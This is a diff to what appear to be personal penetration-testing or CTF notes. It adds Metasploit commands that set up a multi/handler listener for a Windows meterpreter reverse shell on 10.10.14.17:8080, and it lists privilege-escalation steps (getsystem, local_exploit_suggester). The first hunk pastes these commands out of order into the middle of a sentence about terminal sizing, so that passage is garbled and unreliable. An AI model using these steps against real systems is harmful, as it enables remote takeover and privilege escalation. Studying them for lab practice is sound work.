@@ -95,7 +95,14 @@ There’s still one little niggling thing that can happen, the shell might not b
 
 stty size
 
-This should return two numbers, which are the number of rows and columns in your terminal. For example’s sake let’s say this command returned 48 120 Head on back to your victim box’s shell and run the following.
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf5 > use exploit/multi/handler
+
+
+msf5 exploit(multi/handler) > set lhost 10.10.14.17
+lhost => 10.10.14.17
+msf5 exploit(multi/handler) > set lport 8080
+lport => 8080This should return two numbers, which are the number of rows and columns in your terminal. For example’s sake let’s say this command returned 48 120 Head on back to your victim box’s shell and run the following.
 
 stty -rows 48 -columns 120
 
@@ -132,6 +139,30 @@ Windows Site:
 # Shells
 
 https://www.yeahhub.com/msfvenom-all-payload-examples-cheatsheet-2017/
+
+# Metasploit
+
+- Handler
+
+msf> use multi/handler
+
+msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp
+
+msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55)
+
+- Privilige Escalation 1
+
+getsystem
+
+- Privilige Escalation 1
+
+multi/recon/local_exploit_suggester
+
+background
+
+set session 1
+
+run
 
 # Privilige Escalation
 
